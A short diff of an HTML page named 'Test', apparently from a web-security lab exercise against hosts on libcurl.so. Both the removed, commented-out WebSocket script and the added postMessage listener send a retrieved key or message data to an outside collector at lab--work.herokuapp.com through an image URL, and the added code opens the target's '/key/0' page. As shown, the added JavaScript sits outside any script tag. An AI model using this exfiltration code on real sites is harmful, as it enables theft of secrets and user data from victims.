@@ -4,15 +4,9 @@
     <title>Test</title>
 </head>
 <body>
-<!--     <script>
-    var uri   = "ws://ptl-667e9969-827a8291.libcurl.so/";
-    var ws       = new WebSocket(uri);
-    ws.onmessage = function(message) {
-        var data=JSON.parse(message.data);
-        document.write('<img src="http://lab--work.herokuapp.com/?data='+data.text+'" />');
-    };
-    ws.onopen= () => ws.send(JSON.stringify({  text : "/getkey"  }));
-    </script> -->
-    Hello
+    window.addEventListener("message", function(event){
+    document.write("<img src='http://lab--work.herokuapp.com/?leak="+event.data+"' />");},false);
+    
+    window.open("http://ptl-2fff7406-7c2b4832.libcurl.so/key/0");
 </body>
 </html>
